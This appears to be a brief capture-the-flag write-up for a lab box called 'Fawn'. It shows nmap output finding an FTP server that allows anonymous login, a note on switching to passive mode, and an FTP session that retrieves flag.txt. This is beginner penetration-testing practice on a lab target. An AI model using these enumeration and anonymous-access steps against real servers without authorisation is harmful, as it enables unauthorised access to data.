# Fawn

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.230
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04 03:25 flag.txt
Service Info: OS: Unix
```

lol only ftp is open...and anon login allowed

I wonder where the flag could be...

If you get this

```
500 Illegal PORT command.
ftp: bind: Address already in use
```

Go in passive mode (`-p` flag do that too)

```
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,129,142,228,163,180)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04 03:25 flag.txt
226 Directory send OK.
ftp> ls -al
227 Entering Passive Mode (10,129,142,228,225,223)
150 Here comes the directory listing.
drwxr-xr-x    2 0        121          4096 Jun 04 03:25 .
drwxr-xr-x    2 0        121          4096 Jun 04 03:25 ..
-rw-r--r--    1 0        0              32 Jun 04 03:25 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
227 Entering Passive Mode (10,129,142,228,78,15)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (96.7492 kB/s)
```

flag.txt acquired
